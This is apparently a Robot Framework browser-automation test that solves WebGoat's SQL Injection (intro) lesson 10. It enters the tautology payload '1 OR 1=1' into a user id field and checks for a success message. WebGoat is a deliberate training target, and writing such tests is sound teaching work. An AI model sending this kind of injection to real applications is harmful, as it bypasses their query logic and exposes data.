*** Settings ***
Library        Browser
Library        OperatingSystem
Resource       ${EXECDIR}${/}resources${/}keywords${/}webgoat_keywords.robot

*** Test Cases ***
Test SQL Injection 10
    [Documentation]            Test case for SQL Injection task 10 in WebGoat.
    Open and Log In to Webgoat
    Click                      text="(A3) Injection"
    Click                      text="SQL Injection (intro)"
    Click                      text="10"

    ${input_login}=            Get Element        xpath=${WEBGOAT_SLCTRS_10}1]/td[2]/input
    Fill Text                  ${input_login}     1
    ${input_userid}=           Get Element        xpath=${WEBGOAT_SLCTRS_10}2]/td[2]/input
    Fill Text                  ${input_userid}    1 OR 1=1
    Click                      xpath=${WEBGOAT_SLCTRS_10}3]/td[2]/input
    
    Wait For Elements State    (${WEBGOAT_FEEDBACK})[6]    visible    timeout=5s
    ${feedback}=               Get Text           (${WEBGOAT_FEEDBACK})[6]
    Should Contain             ${feedback}        succeed
    Close Browser

